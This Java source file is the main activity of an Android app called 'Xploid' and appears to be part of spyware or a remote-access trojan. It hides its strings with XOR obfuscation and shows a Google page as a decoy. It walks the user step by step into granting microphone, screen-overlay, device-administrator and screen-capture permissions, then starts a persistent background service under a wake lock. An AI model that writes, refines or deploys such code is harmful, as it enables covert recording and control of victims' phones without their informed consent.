package com.zero.xploid;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import android.widget.LinearLayout;
import android.view.ViewGroup;

public class MainActivity extends Activity {
    private static final String TAG = "Xploid_Main";

    private static String $(String str) {
        try {
            StringBuilder sb = new StringBuilder();
            char[] charArray = str.toCharArray();
            for (int i = 0; i < charArray.length; i++) {
                switch (i % 4) {
                    case 0: sb.append((char) (charArray[i] ^ 50238)); break;
                    case 1: sb.append((char) (charArray[i] ^ 26184)); break;
                    case 2: sb.append((char) (charArray[i] ^ 30016)); break;
                    default: sb.append((char) (charArray[i] ^ 65535)); break;
                }
            }
            return sb.toString();
        } catch (Exception e) {
            return str;
        }
    }

    private static final int AUDIO_PERM = 100;
    private static final int SCREEN_PERM = 101;
    private static final int ADMIN_PERM = 102;
    private static final int OVERLAY_PERM = 103;

    private WebView webView;
    private Handler handler = new Handler();
    private boolean serviceRunning = false;
    private boolean permissionsGranted = false;
    private SharedPreferences prefs;
    private PowerManager.WakeLock wakeLock;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            // CRITICAL FIX: Agar manifest me Theme.NoDisplay hai, toh setContentView crash karega.
            // Isliye ise try-catch me wrap kiya hai taaki crash bypass ho sake.
            webView = new WebView(this);
            webView.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT));
            setContentView(webView);
            setupWebView();
        } catch (Exception e) {
            Log.e(TAG, "NoDisplay Layout Conflict Bypassed: " + e.getMessage());
        }

        try {
            prefs = getSharedPreferences($("쑎昭甲ﾒ쑡昸甲ﾚ쑘昻").intern(), MODE_PRIVATE);
        } catch (Exception e) {
            Log.e(TAG, "SharedPreferences initialization failed: " + e.getMessage());
        }

        // Safe Initialization Check
        if (areAllPermissionsGranted()) {
            permissionsGranted = true;
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    startServiceSafely();
                }
            }, 1000);
        } else {
            checkPermissionsSafely();
        }
    }

    private void setupWebView() {
        if (webView == null) return;
        try {
            webView.setWebViewClient(new WebViewClient());
            webView.getSettings().setJavaScriptEnabled(true);
            webView.getSettings().setLoadWithOverviewMode(true);
            webView.getSettings().setUseWideViewPort(true);
            webView.loadUrl(Config.GOOGLE_URL);
        } catch (Exception e) {
            Log.e(TAG, "WebView setup failed: " + e.getMessage());
        }
    }

    private boolean areAllPermissionsGranted() {
        try {
            boolean audioGranted = checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;

            boolean overlayGranted = true;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                overlayGranted = Settings.canDrawOverlays(this);
            }

            boolean adminGranted = isDeviceAdminActive();
            boolean screenGranted = prefs != null && prefs.getBoolean($("쑍昫甲ﾚ쑛昦生ﾜ쑟昸甴ﾊ쑌昭生ﾘ쑌昩甮ﾋ쑛昬").intern(), false);

            return audioGranted && overlayGranted && adminGranted && screenGranted;
        } catch (Exception e) {
            Log.e(TAG, "Error checking permissions state: " + e.getMessage());
            return false;
        }
    }

    private boolean isDeviceAdminActive() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName adminComp = new ComponentName(this, AdminReceiver.class);
            return dpm != null && dpm.isAdminActive(adminComp);
        } catch (Exception e) {
            Log.e(TAG, "DeviceAdmin check failed: " + e.getMessage());
            return false;
        }
    }

    private void checkPermissionsSafely() {
        try {
            if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{android.Manifest.permission.RECORD_AUDIO}, AUDIO_PERM);
                return;
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse($("쑎昩産ﾔ쑟是甥ￅ").intern() + getPackageName()));
                startActivityForResult(intent, OVERLAY_PERM);
                return;
            }

            if (!isDeviceAdminActive()) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                ComponentName adminComp = new ComponentName(this, AdminReceiver.class);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                    $("쑺昭甶ﾖ쑝昭畠ﾾ쑚春甩ﾑ쐞昣甥ﾚ쑎昻畠ﾋ쑖昭畠ﾌ쑛昺甶ﾖ쑝昭畠ﾍ쑋昦甮ﾖ쑐是畠ﾖ쑐晨產ﾞ쑝昣甧ﾍ쑑昽甮ﾛ쐞昿甩ﾋ쑖昧电ﾋ쐞昻甴ﾐ쑎昸甩ﾑ쑙晦").intern());
                startActivityForResult(intent, ADMIN_PERM);
                return;
            }

            if (prefs != null && !prefs.getBoolean($("쑍昫甲ﾚ쑛昦生ﾜ쑟昸甴ﾊ쑌昭生ﾘ쑌昩甮ﾋ쑛昬").intern(), false)) {
                requestScreenCapture();
            } else {
                startServiceSafely();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in checkPermissionsSafely: " + e.getMessage());
            startServiceSafely(); // Fallback strategy
        }
    }

    private void requestScreenCapture() {
        try {
            MediaProjectionManager proj = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (proj != null) {
                startActivityForResult(proj.createScreenCaptureIntent(), SCREEN_PERM);
            }
        } catch (Exception e) {
            Log.e(TAG, "Screen capture request failed: " + e.getMessage());
        }
    }

    private void startServiceSafely() {
        if (serviceRunning) return;

        try {
            Intent intent = new Intent(this, MainService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                // Background execution limitation handles karne ke liye safe initialization
                getApplicationContext().startForegroundService(intent);
            } else {
                startService(intent);
            }
            serviceRunning = true;
            permissionsGranted = true;
        } catch (Exception e) {
            Log.e(TAG, "Failed to start MainService: " + e.getMessage());
            // Safe fallback try
            try {
                startService(new Intent(this, MainService.class));
            } catch (Exception ex) {
                Log.e(TAG, "Critical: Secondary service start crash: " + ex.getMessage());
            }
        }

        // WakeLock Exception Handling
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && (wakeLock == null || !wakeLock.isHeld())) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, $("쑳昱甌ﾐ쑝昣").intern());
                wakeLock.acquire(10*60*1000L); // 10 Minutes timeout default to prevent system leaks
            }
        } catch (Exception e) {
            Log.e(TAG, "WakeLock acquisition failed: " + e.getMessage());
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        try {
            if (code == AUDIO_PERM) {
                if (results.length > 0 && results[0] == PackageManager.PERMISSION_GRANTED) {
                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            checkPermissionsSafely();
                        }
                    }, 500);
                } else {
                    finish();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onRequestPermissionsResult: " + e.getMessage());
        }
    }

    @Override
    protected void onActivityResult(int code, int result, Intent data) {
        super.onActivityResult(code, result, data);
        try {
            if (code == SCREEN_PERM) {
                if (result == RESULT_OK && data != null) {
                    if (prefs != null) {
                        prefs.edit().putBoolean($("쑍昫甲ﾚ쑛昦生ﾜ쑟昸甴ﾊ쑌昭生ﾘ쑌昩甮ﾋ쑛昛").intern(), true).apply();
                    }
                    MainService.setData(data, result);
                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            startServiceSafely();
                        }
                    }, 500);
                } else {
                    finish();
                }
            }
            else if (code == ADMIN_PERM) {
                if (isDeviceAdminActive()) {
                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            checkPermissionsSafely();
                        }
                    }, 500);
                } else {
                    finish();
                }
            }
            else if (code == OVERLAY_PERM) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            checkPermissionsSafely();
                        }
                    }, 500);
                } else {
                    finish();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onActivityResult process: " + e.getMessage());
            finish();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        try {
            if (!serviceRunning && !permissionsGranted && areAllPermissionsGranted()) {
                startServiceSafely();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error during onResume loop: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error releasing wake lock: " + e.getMessage());
        }
    }
}
